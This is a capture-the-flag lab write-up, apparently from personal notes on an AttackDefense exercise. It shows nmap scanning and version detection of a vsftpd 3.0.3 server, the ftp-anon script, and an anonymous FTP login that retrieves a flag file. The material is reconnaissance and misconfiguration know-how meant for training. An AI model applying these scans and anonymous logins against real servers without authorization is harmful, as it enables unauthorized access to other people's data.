#### FTP anonymous login

`ris:PriceTag3` [[Servers and Services#FTP|FTP]]
`ris:Tools`

Questions
1. Find the version of vsftpd server.
2. Check whether anonymous login is allowed on the ftp server using nmap script.
3. Fetch the flag from FTP server.

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
2687: eth0@if2688: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.4/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
2690: eth1@if2691: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:d5:96:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.213.150.2/24 brd 192.213.150.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ping]]

```
root@attackdefense:~# ping -c 5 192.213.150.3
PING 192.213.150.3 (192.213.150.3) 56(84) bytes of data.
64 bytes from 192.213.150.3: icmp_seq=1 ttl=64 time=0.099 ms
64 bytes from 192.213.150.3: icmp_seq=2 ttl=64 time=0.022 ms
64 bytes from 192.213.150.3: icmp_seq=3 ttl=64 time=0.020 ms
64 bytes from 192.213.150.3: icmp_seq=4 ttl=64 time=0.020 ms
64 bytes from 192.213.150.3: icmp_seq=5 ttl=64 time=0.020 ms

--- 192.213.150.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 97ms
rtt min/avg/max/mdev = 0.020/0.036/0.099/0.031 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap 192.213.150.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 09:54 UTC
Nmap scan report for target-1 (192.213.150.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:D5:96:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

[[Hack2.0/NMAP#Service version|NMAP service versioning]]

```
root@attackdefense:~# nmap -p21 -sV -O 192.213.150.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 09:55 UTC
Nmap scan report for target-1 (192.213.150.3)
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
MAC Address: 02:42:C0:D5:96:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.11 seconds
```

Anonymous login with nmap

```
root@attackdefense:~# nmap -p21 --script ftp-anon 192.213.150.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 09:58 UTC
Nmap scan report for target-1 (192.213.150.3)
Host is up (0.000045s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
MAC Address: 02:42:C0:D5:96:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

ftp flag

```
root@attackdefense:~# ftp 192.213.150.3
Connected to 192.213.150.3.
220 (vsFTPd 3.0.3)
Name (192.213.150.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
226 Directory send OK.
ftp> get flag
local: flag remote: flag
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (366.2109 kB/s)
ftp> bye
221 Goodbye.
root@attackdefense:~# ls
README  flag  tools  wordlists
root@attackdefense:~# cat flag 
4267bdfbff77d7c2635e4572519a8b9c
```

